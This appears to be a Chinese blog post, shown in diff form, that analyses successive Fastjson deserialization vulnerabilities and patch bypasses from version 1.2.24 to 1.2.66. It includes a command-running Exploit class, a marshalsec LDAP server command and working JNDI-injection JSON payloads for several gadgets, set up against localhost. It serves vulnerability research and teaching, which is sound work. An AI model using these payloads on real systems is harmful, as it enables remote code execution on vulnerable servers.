+<p>务必记得Exploit.java的编译环境要尽量与漏洞触发环境（客户端）相同</p>
+</blockquote>
+<pre><code class="java">public class Exploit &#123;
+    public Exploit()&#123;
+        try &#123;
+            java.lang.Runtime.getRuntime().exec(new String[]&#123;&quot;calc&quot;&#125;);
+        &#125;
+        catch(Exception e) &#123;
+            e.printStackTrace();
+        &#125;
+    &#125;
+    public static void main(String[] argv)&#123;
+        Exploit e = new Exploit();
+    &#125;
+&#125;
+// javac Explit.java
+// python -m http.server 8888    </code></pre>
+<p><strong>客户端</strong></p>
+<pre><code class="java">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+String jsonstr = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;;
+Object obj = JSON.parseObject(jsonstr);
+System.out.println(obj)</code></pre>
+<p><strong>服务器</strong></p>
+<pre><code class="cmd">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://localhost:8888/#Exploit&quot; 1389</code></pre>
+<p><strong>分析</strong></p>
+<p>反序列化调用<code>setAutoCommit()</code>函数进行赋值，期间会调用<code>connect()</code>函数</p>
+<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105240210736d2a3107a8f4a9ac8a.png" alt="image-20210523021746723" style="zoom: 80%;" />
+
+<p>跟进<code>connect()</code>函数，如果<code>dataSourceName</code>不为空就会调用<code>lookup()</code>函数造成jndi注入</p>
+<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105240210be38ee1879569a57a263.png" alt="image-20210523021713896" style="zoom: 80%;" />
+
+<p><strong>Patch</strong></p>
+<p>在<code>parseObject()</code>中引入了<code>checkAutoType()</code>的黑白名单检查</p>
+<pre><code class="java">public class DefaultJSONParser implements Closeable &#123;
+
+    public final Object parseObject(Map object, Object fieldName) &#123;
+        ...
+        if (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;
+            typeName = lexer.scanSymbol(this.symbolTable, &#39;&quot;&#39;);
+            if (!lexer.isEnabled(Feature.IgnoreAutoType)) &#123;
+                strValue = null;
+                Class clazz;
+                if (object != null &amp;&amp; object.getClass().getName().equals(typeName)) &#123;
+                    clazz = object.getClass();
+                &#125; else &#123;
+                    clazz = this.config.checkAutoType(typeName, (Class)null, lexer.getFeatures()); // 检查黑名单
+                &#125;
+        ...</code></pre>
+<p><code>checkAutoType()</code>函数的详细代码</p>
+<pre><code class="java">public class ParserConfig &#123;
+
+    public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features) &#123;
+        if (typeName == null) &#123;
+            return null;
+        &#125; else if (typeName.length() &gt;= 128) &#123; // 限制了小于128的长度
+            throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+        &#125; else &#123;
+            String className = typeName.replace(&#39;$&#39;, &#39;.&#39;);
+            Class&lt;?&gt; clazz = null;
+            int mask;
+            String accept;
+            if (this.autoTypeSupport || expectClass != null) &#123;
+                for(mask = 0; mask &lt; this.acceptList.length; ++mask) &#123; // 检查白名单
+                    accept = this.acceptList[mask];
+                    if (className.startsWith(accept)) &#123;
+                        clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, false);
+                        if (clazz != null) &#123;
+                            return clazz;
+                        &#125;
+                    &#125;
+                &#125;
+
+                for(mask = 0; mask &lt; this.denyList.length; ++mask) &#123; // 检查黑名单
+                    accept = this.denyList[mask];
+                    if (className.startsWith(accept) &amp;&amp; TypeUtils.getClassFromMapping(typeName) == null) &#123;
+                        throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+                    &#125;
+                &#125;
+            &#125;
+
+            if (clazz == null) &#123;
+                clazz = TypeUtils.getClassFromMapping(typeName);
+            &#125;
+
+            if (clazz == null) &#123;
+                clazz = this.deserializers.findClass(typeName);
+            &#125;
+
+            if (clazz != null) &#123;
+                if (expectClass != null &amp;&amp; clazz != HashMap.class &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123; // 检查类是否在预期类中
+                    throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
+                &#125; else &#123;
+                    return clazz;
+                &#125;
+            &#125; else &#123;
+                if (!this.autoTypeSupport) &#123;
+                    for(mask = 0; mask &lt; this.denyList.length; ++mask) &#123;
+                        accept = this.denyList[mask];
+                        if (className.startsWith(accept)) &#123;
+                            throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+                        &#125;
+                    &#125;
+
+                    for(mask = 0; mask &lt; this.acceptList.length; ++mask) &#123;
+                        accept = this.acceptList[mask];
+                        if (className.startsWith(accept)) &#123;
+                            if (clazz == null) &#123;
+                                clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, false);
+                            &#125;
+
+                            if (expectClass != null &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;
+                                throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
+                            &#125;
+
+                            return clazz;
+                        &#125;
+                    &#125;
+                &#125;
+
+                if (clazz == null) &#123;
+                    clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, false); // 在这一步进行只爱之前loadCLass()
+                &#125;
+
+                ...</code></pre>
+<h3 id="1-2-41漏洞"><a href="#1-2-41漏洞" class="headerlink" title="1.2.41漏洞"></a>1.2.41漏洞</h3><blockquote>
+<p>针对1.2.24版本漏洞补丁的绕过</p>
+</blockquote>
+<p><strong>客户端</strong></p>
+<pre><code class="java">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+String jsonstr = &quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;;
+Object obj = JSON.parseObject(jsonstr);
+System.out.println(obj)</code></pre>
+<p>只需在<code>@type</code>字段的首尾加多一个<code>L</code>和<code>;</code></p>
+<p><strong>分析</strong></p>
+<p>很粗暴的绕过方式，看过上面1.2.24版本的补丁可以知道，Fastjson会把对类名的修正（删除一些多余的描述符）放在了检查黑白名单的代码之后，这是个经典的<strong>TOCTOU漏洞</strong>，具体代码如下</p>
+<p>在<code>com/alibaba/fastjson/util/TypeUtils.java</code>中的<code>loadClass()</code>方法中</p>
+<pre><code class="java">public class TypeUtils &#123;
+
+    public static Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, boolean cache) &#123;
+        if (className != null &amp;&amp; className.length() != 0) &#123;
+            Class&lt;?&gt; clazz = (Class)mappings.get(className);
+            if (clazz != null) &#123;
+                return clazz;
+            &#125; else if (className.charAt(0) == &#39;[&#39;) &#123;
+                Class&lt;?&gt; componentType = loadClass(className.substring(1), classLoader);
+                return Array.newInstance(componentType, 0).getClass();
+            &#125; else if (className.startsWith(&quot;L&quot;) &amp;&amp; className.endsWith(&quot;;&quot;)) &#123; // 绕过的条件
+                String newClassName = className.substring(1, className.length() - 1);
+                return loadClass(newClassName, classLoader);
+            &#125; 
+
+            ...</code></pre>
+<p>在该方法中有两处字符检查，第一处的作用是匹配以<code>&#39;[&#39;</code>开头的字符串，而第二处则是匹配以”L”开头，以”;”结尾的字符串</p>
+<p><code>[LAutoTypeTest.ForTest;</code>这种类型的字符串其实是一种对函数返回值和参数的编码，名为<strong>JNI字段描述符</strong></p>
+<p>其中首个字符”[“用以表示数组的层数，而第二个字符则代表数组的类型。</p>
+<blockquote>
+<p>这里举例说明一下JNI字段描述符的格式：</p>
+<ol>
+<li><p>double对应的类对象名为”[[D”</p>
+</li>
+<li><p>int[]对应的类对象名则为”[I”</p>
+</li>
+<li><p>AutoTypeTest.ForTest[]对应的类对象名则为”[LAutoTypeTest.ForTest;”</p>
+</li>
+</ol>
+<p>而L为类描述符，”L”与”;”之间的字符串表示着该类对象的所属类（AutoTypeTest.ForTest）</p>
+</blockquote>
+<p><strong>Patch</strong></p>
+<p>限制传入的类名长度，引入了黑名单加密混淆机制，将所有类型检验换成了<code>hashCode</code>，为了不让研究人员直接看到被明文黑白名单（但是可以爆破绕过，详细的可以看文章底下的<strong>哈希黑名单</strong>），然后在检验黑白名单之前先去掉首尾的<code>&quot;L&quot;</code>和<code>&quot;;&quot;</code></p>
+<h3 id="1-2-42漏洞"><a href="#1-2-42漏洞" class="headerlink" title="1.2.42漏洞"></a>1.2.42漏洞</h3><blockquote>
+<p>绕过1.2.41的补丁</p>
+</blockquote>
+<p><strong>客户端</strong></p>
+<pre><code class="java">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+String jsonstr = &quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;;
+Object obj = JSON.parseObject(jsonstr);
+System.out.println(obj)</code></pre>
+<p>直接再套多一层<code>&quot;L&quot;</code>和<code>&quot;;&quot;</code>即可绕过补丁</p>
+<p><strong>分析</strong></p>
+<p>跟进<code>checkAutoType()</code>函数</p>
+<pre><code class="java">public class ParserConfig &#123;
+
+    public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features) &#123;
+        if (typeName == null) &#123;
+            return null;
+        &#125; else if (typeName.length() &lt; 128 &amp;&amp; typeName.length() &gt;= 3) &#123;
+            String className = typeName.replace(&#39;$&#39;, &#39;.&#39;);
+            Class&lt;?&gt; clazz = null;
+            long BASIC = -3750763034362895579L;
+            long PRIME = 1099511628211L;
+            if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) &#123; // 经过动态调试可以知道这里是去掉了一层&quot;L&quot;和&quot;;&quot;
+                className = className.substring(1, className.length() - 1);
+            &#125;
+
+            ...</code></pre>
+<p><strong>Patch</strong></p>
+<p>className开头是<code>&quot;LL&quot;</code>就抛出错误</p>
+<pre><code class="java">public class ParserConfig &#123;
+
+    public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features) &#123;
+        if (typeName == null) &#123;
+            return null;
+        &#125; else if (typeName.length() &lt; 128 &amp;&amp; typeName.length() &gt;= 3) &#123;
+            String className = typeName.replace(&#39;$&#39;, &#39;.&#39;);
+            Class&lt;?&gt; clazz = null;
+            long BASIC = -3750763034362895579L;
+            long PRIME = 1099511628211L;
+            if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) &#123;
+                if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(1)) * 1099511628211L == 655656408941810501L) &#123; // 检验开头是否为&quot;LL&quot;，然后抛出错误
+                    throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+                &#125;
+
+                className = className.substring(1, className.length() - 1);
+            &#125;</code></pre>
+<h3 id="1-2-43漏洞"><a href="#1-2-43漏洞" class="headerlink" title="1.2.43漏洞"></a>1.2.43漏洞</h3><blockquote>
+<p>绕过1.2.42的补丁</p>
+</blockquote>
+<p><strong>客户端</strong></p>
+<pre><code class="java">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+String jsonstr = &quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;\&quot;dataSourceName\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;, \&quot;autoCommit\&quot;:false&#125;]&quot;;
+Object obj = JSON.parseObject(jsonstr);
+System.out.println(obj)</code></pre>
+<p>采用畸形<code>&quot;[&quot;</code>和<code>&quot;&#123;&quot;</code>进行绕过</p>
+<p><strong>分析</strong></p>
+<p>大家应该记得，除了前面用到的<code>&quot;L&quot;</code>和<code>&quot;;&quot;</code>，我们还会对首位的<code>&quot;[&quot;</code>进行修改，再一次看<code>loadClass()</code>函数</p>
+<pre><code class="java">public class TypeUtils &#123;
+
+    public static Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, boolean cache) &#123;
+        if (className != null &amp;&amp; className.length() != 0) &#123;
+            Class&lt;?&gt; clazz = (Class)mappings.get(className);
+            if (clazz != null) &#123;
+                return clazz;
+            &#125; else if (className.charAt(0) == &#39;[&#39;) &#123;
+                Class&lt;?&gt; componentType = loadClass(className.substring(1), classLoader); // 删掉首位的&quot;[&quot;
+                return Array.newInstance(componentType, 0).getClass(); // 实例化类
+            &#125; else if (className.startsWith(&quot;L&quot;) &amp;&amp; className.endsWith(&quot;;&quot;)) &#123;
+                String newClassName = className.substring(1, className.length() - 1);
+                return loadClass(newClassName, classLoader);
+            &#125;
+
+            ...</code></pre>
+<p>在Lexer分析完类名之后，此时Lexer已经分析到这个位置<code>[&#123;&quot;dataSourceName&quot;...</code>，而且代码将会检查token为16时后一个预期字符</p>
+<pre><code class="java">// public final Object parseObject(Map object, Object fieldName)
+if (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;
+    typeName = lexer.scanSymbol(this.symbolTable, &#39;&quot;&#39;);
+    if (!lexer.isEnabled(Feature.IgnoreAutoType)) &#123;
+        strValue = null;
+        Class clazz;
+        if (object != null &amp;&amp; object.getClass().getName().equals(typeName)) &#123;
+            clazz = object.getClass();
+        &#125; else &#123;
+            clazz = this.config.checkAutoType(typeName, (Class)null, lexer.getFeatures());
+        &#125;
+
+        if (clazz != null) &#123;
+            lexer.nextToken(16); // 检查expect为16的token
+            if (lexer.token() == 13) &#123;
+                lexer.nextToken(16);
+
+// public final void nextToken(int expect)
+case 16:
+    if (this.ch == &#39;,&#39;) &#123;
+        this.token = 16;
+        this.next();
+        return;
+    &#125;
+
+    if (this.ch == &#39;&#125;&#39;) &#123;
+        this.token = 13;
+        this.next();
+        return;
+    &#125;
+
+    if (this.ch == &#39;]&#39;) &#123;
+        this.token = 15;
+        this.next();
+        return;
+    &#125;
+
+    if (this.ch == 26) &#123;
+        this.token = 20;
+        return;
+    &#125;
+    break;
+    ...
+    if (this.ch != &#39; &#39; &amp;&amp; this.ch != &#39;\n&#39; &amp;&amp; this.ch != &#39;\r&#39; &amp;&amp; this.ch != &#39;\t&#39; &amp;&amp; this.ch != &#39;\f&#39; &amp;&amp; this.ch != &#39;\b&#39;) &#123;
+        this.nextToken(); // 因为我们的payload的类名的后一个字符为&#39;[&#39;，所以会调用nextToken()函数设置新的token
+        return;
+    &#125;
+    ...
+
+// public final void nextToken() 
+case &#39;[&#39;:
+    this.next();
+    this.token = 14; // 将token设置为14
+    return;</code></pre>
+<p>下面阐述一下为什么一定要把token设置为14</p>
+<pre><code class="java">// public final Object parseObject(Map object, Object fieldName)
+ObjectDeserializer deserializer = this.config.getDeserializer(clazz);
+thisObj = deserializer.deserialze(this, clazz, fieldName); // 进入反序列化
+return thisObj;
+
+// public &lt;T&gt; T deserialze(DefaultJSONParser parser, Type type, Object fieldName)
+JSONArray array = new JSONArray();
+parser.parseArray((Type)componentType, array, fieldName); // 解析类成员
+return this.toObjectArray(parser, componentClass, array);
+
+// public void parseArray(Type type, Collection array, Object fieldName)
+if (token != 14) &#123; // token不等于14就会报错
+    throw new JSONException(&quot;exepct &#39;[&#39;, but &quot; + JSONToken.name(token) + &quot;, &quot; + this.lexer.info());
+&#125; else &#123;
+    ObjectDeserializer deserializer = null;
+    if (Integer.TYPE == type) &#123;
+        deserializer = IntegerCodec.instance;
+        this.lexer.nextToken(2);
+    &#125; else if (String.class == type) &#123;
+        deserializer = StringCodec.instance;
+        this.lexer.nextToken(4);
+    &#125; else &#123;
+        deserializer = this.config.getDeserializer(type);
+        this.lexer.nextToken(((ObjectDeserializer)deserializer).getFastMatchToken()); // getFastMatchToken()返回的是12，可以成功搜索到下一个字符是&#39;&#123;&#39;，对应的token设置为12
+    &#125;
+
+    ParseContext context = this.context;
+    this.setContext(array, fieldName);
+
+    try &#123;
+        int i = 0;
+
+        while(true) &#123;
+            if (this.lexer.isEnabled(Feature.AllowArbitraryCommas)) &#123;
+                while(this.lexer.token() == 16) &#123;
+                    this.lexer.nextToken();
+                &#125;
+            &#125;
+
+            if (this.lexer.token() == 15) &#123;
+                break;
+            &#125;
+
+            Object val;
+            if (Integer.TYPE == type) &#123;
+                val = IntegerCodec.instance.deserialze(this, (Type)null, (Object)null);
+                array.add(val);
+            &#125; else if (String.class == type) &#123;
+                String value;
+                if (this.lexer.token() == 4) &#123;
+                    value = this.lexer.stringVal();
+                    this.lexer.nextToken(16);
+                &#125; else &#123;
+                    Object obj = this.parse();
+                    if (obj == null) &#123;
+                        value = null;
+                    &#125; else &#123;
+                        value = obj.toString();
+                    &#125;
+                &#125;
+
+                array.add(value);
+            &#125; else &#123;
+                if (this.lexer.token() == 8) &#123;
+                    this.lexer.nextToken();
+                    val = null;
+                &#125; else &#123;
+                    val = ((ObjectDeserializer)deserializer).deserialze(this, type, i); // 因为token是12，所以最终会走到这一步完成反序列化
+                &#125;</code></pre>
+<p><strong>Patch</strong></p>
+<p>判断类型的第一个字符是否为”[“</p>
+<pre><code class="java">public class ParserConfig &#123;
+
+    public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features) &#123;
+        if (typeName == null) &#123;
+            return null;
+        &#125; else if (typeName.length() &lt; 128 &amp;&amp; typeName.length() &gt;= 3) &#123;
+            String className = typeName.replace(&#39;$&#39;, &#39;.&#39;);
+            Class&lt;?&gt; clazz = null;
+            long BASIC = -3750763034362895579L;
+            long PRIME = 1099511628211L;
+            long h1 = (-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L;
+            if (h1 == -5808493101479473382L) &#123;
+                throw new JSONException(&quot;autoType is not support. &quot; + typeName); // 第一个字符是否为&quot;[&quot;则抛出错误
+            &#125;</code></pre>
+<h3 id="1-2-45漏洞"><a href="#1-2-45漏洞" class="headerlink" title="1.2.45漏洞"></a>1.2.45漏洞</h3><blockquote>
+<p>利用了一条黑名单中不包含的元素，从而绕过了黑名单限制，需要额外安装mybatis库</p>
+</blockquote>
+<p><strong>客户端</strong></p>
+<pre><code class="java">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+String jsonstr = &quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\&quot;properties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;&#125;&#125;&quot;;
+Object obj = JSON.parseObject(jsonstr);
+System.out.println(obj)</code></pre>
+<p>JndiDataSourceFactory不在黑名单中，通过指定data_source实现JNDI注入</p>
+<p><strong>分析</strong></p>
+<p>直接放图</p>
+<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105241715d814a1a9336319d4f794.png" alt="image-20210524170435859" style="zoom:80%;" />
+
+<p>从这个代码可以看到也可以用<code>initial_context</code>属性，但是还要同时设置<code>data_source</code>属性才能用，所以就没什么必要</p>
+<p><strong>Patch</strong></p>
+<p>扩充了不少黑名单</p>
+<h3 id="1-2-47漏洞"><a href="#1-2-47漏洞" class="headerlink" title="1.2.47漏洞"></a>1.2.47漏洞</h3><blockquote>
+<p>使用新的Gadget绕过黑名单</p>
+<p>需要 1.2.33 ≤ Fastjson版本 ≤ 1.2.47，是否开启setAutoTypeSupport都能成功</p>
+<p>需要 1.2.25 ≤ Fastjson版本 ≤ 1.2.32，关闭setAutoTypeSupport能成功</p>
+</blockquote>
+<p><strong>客户端</strong></p>
+<pre><code class="java">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+String jsonstr = &quot;&#123;\&quot;a\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,\&quot;b\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;,\&quot;autoCommit\&quot;:true&#125;&#125;&#125;&quot;;
+Object obj = JSON.parseObject(jsonstr);
+System.out.println(obj)</code></pre>
+<p>由于Poc开头不为<code>@type</code>等预置类型，所以按Map类型解析，其中会调用<code>parseObject()</code>，第一次反序列化时，<code>java.lang.Class</code>绕过黑名单，将<code>com.sun.rowset.JdbcRowSetImpl</code>加入到缓存数组，第二次反序列化时，由于<code>com.sun.rowset.JdbcRowSetImpl</code>已在缓存之中，所以绕过了黑名单检测的过程，成功进行JNDI注入</p>
+<p><strong>分析</strong></p>
+<p>在IDEA中把mappings成员添加到断点中</p>
+<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105242020d3262fb8bf8cb8b77d92.png" alt="image-20210524175959882" style="zoom: 67%;" />
+
+<p>勾上<code>Field access</code>选项</p>
+<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105242020e7c324ba7cb18e536e22.png" alt="image-20210524180038665" style="zoom: 67%;" />
+
+<p>在运行完<code>java.lang.Class</code>类的<code>parseObject()</code>函数之后再进行监听，持续跟进就会看到调用到下面的<code>loadClass()</code>函数，大概情况就是<code>java.lang.Class</code>在反序列化时会把<code>value</code>属性值识别为<code>Object</code>类型，如果<code>key</code>值本身又属于<code>Class.class</code>类型时，便会对<code>value</code>属性值调用下面的<code>loadClass()</code>函数把这个<code>Object</code>加载进来</p>
+<pre><code class="java">public class TypeUtils &#123;
+
+    public static Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, boolean cache) &#123;
+        if (className != null &amp;&amp; className.length() != 0) &#123;
+            Class&lt;?&gt; clazz = (Class)mappings.get(className);
+            if (clazz != null) &#123;
+                return clazz;
+            &#125; else if (className.charAt(0) == &#39;[&#39;) &#123;
+                Class&lt;?&gt; componentType = loadClass(className.substring(1), classLoader);
+                return Array.newInstance(componentType, 0).getClass();
+            &#125; else if (className.startsWith(&quot;L&quot;) &amp;&amp; className.endsWith(&quot;;&quot;)) &#123;
+                String newClassName = className.substring(1, className.length() - 1);
+                return loadClass(newClassName, classLoader);
+            &#125; else &#123;
+                try &#123;
+                    if (classLoader != null) &#123;
+                        clazz = classLoader.loadClass(className);
+                        if (cache) &#123;
+                            mappings.put(className, clazz);
+                        &#125;
+
+                        return clazz;
+                    &#125;
+                &#125; catch (Throwable var7) &#123;
+                    var7.printStackTrace();
+                &#125;
+
+                try &#123;
+                    ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();
+                    if (contextClassLoader != null &amp;&amp; contextClassLoader != classLoader) &#123;
+                        clazz = contextClassLoader.loadClass(className);
+                        if (cache) &#123; // 支持缓存
+                            mappings.put(className, clazz); // 把类名和类存进mappings
+                        &#125;
+
+                        return clazz;
+                    &#125;
+                &#125; catch (Throwable var6) &#123;
+                &#125;
+
+                try &#123;
+                    clazz = Class.forName(className);
+                    mappings.put(className, clazz);
+                    return clazz;
+                &#125; catch (Throwable var5) &#123;
+                    return clazz;
+                &#125;
+            &#125;
+        &#125; else &#123;
+            return null;
+        &#125;
+    &#125;</code></pre>
+<p>当第二次解析<code>@type</code>时就可以绕过黑名单校验了</p>
+<pre><code class="java">public class ParserConfig &#123;
+
+    public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features) &#123;
+
+        ...
+
+        if (this.autoTypeSupport || expectClass != null) &#123;
+            hash = h3;
+
+            for(i = 3; i &lt; className.length(); ++i) &#123;
+                hash ^= (long)className.charAt(i);
+                hash *= 1099511628211L;
+                if (Arrays.binarySearch(this.acceptHashCodes, hash) &gt;= 0) &#123;
+                    clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, false);
+                    if (clazz != null) &#123;
+                        return clazz;
+                    &#125;
+                &#125;
+
+                if (Arrays.binarySearch(this.denyHashCodes, hash) &gt;= 0 &amp;&amp; TypeUtils.getClassFromMapping(typeName) == null) &#123; // 当第二次解析@type时，com.sun.rowset.JdbcRowSetImpl以存储在mappings中，导致绕过黑名单
+                    throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+                &#125;
+            &#125;
+        &#125;</code></pre>
+<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105242043a777324565c5c5c4d5b4.png" alt="image-20210524172832135" style="zoom:80%;" />
+
+<p><strong>Patch</strong></p>
+<p>把<code>java.lang.Class</code>列入黑名单，把默认缓存从True改为False</p>
+<h3 id="1-2-62漏洞"><a href="#1-2-62漏洞" class="headerlink" title="1.2.62漏洞"></a>1.2.62漏洞</h3><blockquote>
+<p>使用新的Gadget绕过黑名单</p>
+<p>需要 Fastjson版本 ≤ 1.2.62，并且需要开启setAutoTypeSupport</p>
+<p>需要额外安装xbean-reflect（我的测试版本为3.4）</p>
+</blockquote>
+<p><strong>客户端</strong></p>
+<pre><code class="java">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+String jsonstr = &quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.xbean.propertyeditor.JndiConverter\&quot;,\&quot;AsText\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;&#125;&quot;
+Object obj = JSON.parseObject(jsonstr);
+System.out.println(obj)</code></pre>
+<p><strong>分析</strong></p>
+<pre><code class="java">package org.apache.xbean.propertyeditor;
+public abstract class AbstractConverter extends PropertyEditorSupport implements Converter 
+
+    public final void setAsText(String text) &#123;
+        Object value = this.toObject(text.trim()); // 调用toObject()函数
+        super.setValue(value);
+    &#125;
+
+    public final Object toObject(String text) &#123;
+        if (text == null) &#123;
+            return null;
+        &#125; else &#123;
+            Object value = this.toObjectImpl(text.trim()); // 调用toObjectImpl()函数
+            return value;
+        &#125;
+    &#125;</code></pre>
+<pre><code class="java">package org.apache.xbean.propertyeditor;
+public class JndiConverter extends AbstractConverter &#123;
+
+    protected Object toObjectImpl(String text) &#123;
+        try &#123;
+            InitialContext context = new InitialContext();
+            return (Context)context.lookup(text); // 调用lookup()函数实现JNDI注入
+        &#125; catch (NamingException var3) &#123;
+            throw new PropertyEditorException(var3);
+        &#125;
+    &#125;
+&#125;</code></pre>
+<p>这里提供了一个新的思路就是可以从父类中找<code>set</code>函数，但也算不上是新的思路，只不过是找到第三方库里面的<code>lookup()</code>函数再向上回溯罢了 : )</p>
+<p><strong>Patch</strong></p>
+<p>扩充黑名单</p>
+<h3 id="1-2-66漏洞"><a href="#1-2-66漏洞" class="headerlink" title="1.2.66漏洞"></a>1.2.66漏洞</h3><blockquote>
+<p>使用新的Gadget绕过黑名单</p>
+<p>需要 Fastjson版本 ≤ 1.2.66，并且需要开启setAutoTypeSupport</p>
+<p>下面用到的Gadget都需要导入第三方库，直接搜就好，部分触发时必须使用parseObject()函数</p>
+</blockquote>
+<p>公开的Gadget一共有下面四个：</p>
+<p><strong>JndiObjectFactory</strong></p>
+<pre><code class="java">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+String jsonstr = &quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.shiro.jndi.JndiObjectFactory\&quot;,\&quot;resourceName\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;&#125;&quot;;
+Object obj = JSON.parseObject(jsonstr);
+System.out.println(obj)</code></pre>
+<p>触发代码如下：</p>
+<pre><code class="java">package org.apache.shiro.jndi;
+public class JndiObjectFactory&lt;T&gt; extends JndiLocator implements Factory&lt;T&gt; &#123;
+
+    public void setResourceName(String resourceName) &#123;
+        this.resourceName = resourceName; // 传入resourceName
+    &#125;
+
+    public T getInstance() &#123;
+        try &#123;
+            return this.requiredType != null ? this.requiredType.cast(this.lookup(this.resourceName, this.requiredType)) : this.lookup(this.resourceName); // 触发JNDI注入
+        &#125; catch (NamingException var3) &#123;
+            String typeName = this.requiredType != null ? this.requiredType.getName() : &quot;object&quot;;
+            throw new IllegalStateException(&quot;Unable to look up &quot; + typeName + &quot; with jndi name &#39;&quot; + this.resourceName + &quot;&#39;.&quot;, var3);
+        &#125;
+    &#125;</code></pre>
+<p><strong>AnterosDBCPConfig</strong></p>
+<pre><code class="java">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+String jsonstr = &quot;&#123;\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;metricRegistry\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;&#125;&quot;;
+Object obj = JSON.parseObject(jsonstr);
+System.out.println(obj)</code></pre>
+<p>触发代码如下：</p>
+<pre><code class="java">package br.com.anteros.dbcp;
+public class AnterosDBCPConfig implements AnterosDBCPConfigMXBean &#123;
+
+    public void setMetricRegistry(Object metricRegistry) &#123;
+        if (this.metricsTrackerFactory != null) &#123;
+            throw new IllegalStateException(&quot;cannot use setMetricRegistry() and setMetricsTrackerFactory() together&quot;);
+        &#125; else &#123;
+            if (metricRegistry != null) &#123;
+                metricRegistry = this.getObjectOrPerformJndiLookup(metricRegistry); // 传入metricRegistry
+                if (!UtilityElf.safeIsAssignableFrom(metricRegistry, &quot;com.codahale.metrics.MetricRegistry&quot;) &amp;&amp; !UtilityElf.safeIsAssignableFrom(metricRegistry, &quot;io.micrometer.core.instrument.MeterRegistry&quot;)) &#123;
+                    throw new IllegalArgumentException(&quot;Class must be instance of com.codahale.metrics.MetricRegistry or io.micrometer.core.instrument.MeterRegistry&quot;);
+                &#125;
+            &#125;
+
+            this.metricRegistry = metricRegistry;
+        &#125;
+    &#125;
